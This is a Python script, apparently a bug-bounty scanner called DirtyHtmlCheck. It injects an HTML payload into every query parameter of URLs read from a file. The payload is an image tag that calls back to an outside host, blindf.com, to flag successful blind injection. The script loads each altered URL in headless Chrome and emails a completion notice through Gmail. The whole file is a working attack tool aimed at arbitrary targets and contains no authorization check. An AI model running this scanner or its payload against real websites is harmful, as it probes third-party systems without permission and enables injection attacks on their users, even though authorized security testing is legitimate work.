'''
This script reads urls from urls.txt files.
Put html payload into all parameters.
If html injection found. You will get email notification from the www.blindf.com
'''
import urllib.parse as urlparse
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def html_check(url, number):
    path = urlparse.urlparse(url).path
    payload = "\"><img src='https://blindf.com/b.php?c=html_injection_on_"+path+"'/>"
    trigger = [payload]
    parsed = urlparse.urlparse(url)
    querys = parsed.query.split("&")
    result = []
    for pairs in trigger:
        new_query = "&".join([ "{}{}".format(query, pairs) for query in querys])
        parsed = parsed._replace(query=new_query)
        result.append(urlparse.urlunparse(parsed))

    for urls in result:
        chrome_options = Options()
        chrome_options.add_argument('--headless=new')      # remove comment if want to display chrome again and again.
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--user-data-dir=/home/me/foo')
        chrome_options.add_argument('--remote-debugging-port=9222')
        chrome_options.add_argument('--disable-dev-shm-usage')
        driver_path = Service("chromedriver")
        driver = webdriver.Chrome(service=driver_path, options=chrome_options)
        #driver = webdriver.Chrome()
        print(number)
        print(urls)
        try:
            driver.get(urls)
        except:
            print("Error occurred. Moving toward next url")
        finally:
            print("")

#Count total url
file1 = open('urls.txt','r',encoding="utf8")
line_count = 0
for line in file1:
    if line != "\n":
        line_count += 1
print("Total Url: {}".format(line_count))
file1.close()

#Pass url to the html_check() function
file1 = open('urls.txt','r',encoding="utf8")
data = file1.readlines()   #Read lines saperately
number = 1
for lines in data:
    urls = lines.replace("&amp;", "&")
    urls= urlparse.unquote_plus(urls)
    html_check(urls, number)                        # Calling function
    number = number+1
file1.close()

#Getting domain name to pass it to the mail
getting_domain = open('urls.txt','r',encoding="utf8")
first_line = getting_domain.readline()
domain = urlparse.urlparse(first_line)
domain_name = domain.netloc
getting_domain.close()


#Send mail for EOF
mail_content = domain_name + " : DirtyHtmlCheck Scanning Done. Please provide another target."
# The mail addresses and password
sender_address = 'dirtynotification@gmail.com'
sender_pass = 'YOUR_GMAIL_PASSWORD_HERE'
receiver_address = 'dirtycoder0124@gmail.com'
# Setup the MIME
message = MIMEMultipart()
message['From'] = sender_address
message['To'] = receiver_address 
message['Subject'] = 'DirtyHTMLCheck for '+ domain_name+' Completed.'  # The subject line

# The body and the attachments for the mail
message.attach(MIMEText(mail_content, 'plain'))
# Create SMTP session for sending the mail
session = smtplib.SMTP('smtp.gmail.com', 587)  # use gmail with port
session.starttls()  # enable security
session.login(sender_address, sender_pass)  # login with mail_id and password
text = message.as_string()
session.sendmail(sender_address, receiver_address, text)
session.quit()
print('Mail Sent')

